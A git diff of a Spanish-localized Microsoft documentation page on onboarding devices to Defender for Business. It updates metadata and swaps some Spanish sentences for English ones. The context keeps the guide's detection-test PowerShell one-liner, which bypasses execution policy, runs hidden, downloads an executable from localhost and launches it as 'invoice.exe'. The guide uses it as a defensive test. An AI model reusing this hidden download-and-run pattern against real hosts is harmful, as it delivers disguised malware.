@@ -15,13 +15,14 @@ ms.reviewer: shlomiakirav
 f1.keywords: NOCSH
 ms.collection:
 - SMB
-- M365-security-compliance
-ms.openlocfilehash: 72d710e2db7ff160039e96e34f1f4b05d83ff681
-ms.sourcegitcommit: c29af68260ba8676083674b3c70209bff2c2e362
+- m365-security
+- tier1
+ms.openlocfilehash: d358c456bea558bae4b5c17f7d0ea52e8a5803a9
+ms.sourcegitcommit: 0283c436f3ba61a708b52b57a1955f5ea74376a3
 ms.translationtype: MT
 ms.contentlocale: es-ES
-ms.lasthandoff: 09/16/2022
-ms.locfileid: "67736990"
+ms.lasthandoff: 09/28/2022
+ms.locfileid: "68097103"
 ---
 # <a name="onboard-enrolled-devices-to-microsoft-defender-for-business"></a>Incorporación de dispositivos inscritos a Microsoft Defender para Empresas
 
@@ -91,7 +92,7 @@ Después de incorporar dispositivos Windows a Defender para empresas, puedes eje
    powershell.exe -NoExit -ExecutionPolicy Bypass -WindowStyle Hidden $ErrorActionPreference = 'silentlycontinue';(New-Object System.Net.WebClient).DownloadFile('http://127.0.0.1/1.exe', 'C:\\test-MDATP-test\\invoice.exe');Start-Process 'C:\\test-MDATP-test\\invoice.exe'
    ```
 
-Una vez ejecutado el comando, la ventana del símbolo del sistema se cierra automáticamente. Si se realiza correctamente, la prueba de detección se marca como completada y aparece una nueva alerta en el portal de Microsoft 365 Defender ([https://security.microsoft.com](https://security.microsoft.com)) para el dispositivo recién incorporado en unos diez minutos.
+After the command has run, the Command Prompt window closes automatically. If successful, the detection test is marked as completed, and a new alert appears in the Microsoft 365 Defender portal ([https://security.microsoft.com](https://security.microsoft.com)) for the newly-onboarded device in about ten minutes.
 
 ## <a name="onboard-devices-gradually"></a>Incorporar dispositivos gradualmente
 
@@ -103,7 +104,7 @@ Si prefiere incorporar dispositivos en fases, que llamamos *a incorporación de 
 
 3. En el panel de navegación, elija **Settings** > **Endpoints**, y, a continuación, en **Management**, elige **Incorporación**.
 
-4. Seleccione un sistema operativo (como **Windows 10 y 11)** y, a continuación, elija un método de incorporación (como **Script local**). Siga las instrucciones proporcionadas para el método seleccionado.
+4. Select an operating system (such as **Windows 10 and 11)**, and then choose an onboarding method (such as **Local script**). Follow the guidance provided for the method you selected.
 
 5. Repita este proceso para cada conjunto de dispositivos que quiera incorporar. 
 
@@ -122,7 +123,7 @@ Si desea desconectar un dispositivo, use uno de los procedimientos siguientes:
 
 4. En la pantalla de confirmación, revise la información y elija **Descargar** para continuar.
 
-5. Seleccione **Descargar paquete de retirada**. Se recomienda guardar el paquete de retirada en una unidad extraíble.
+5. Seleccione **Descargar paquete de desincorporación**. Se recomienda guardar el paquete de retirada en una unidad extraíble.
 
 6. Ejecute el script en cada dispositivo que quiera desincorporar. ¿Necesita ayuda con esta tarea? Vea los siguientes recursos:   
 
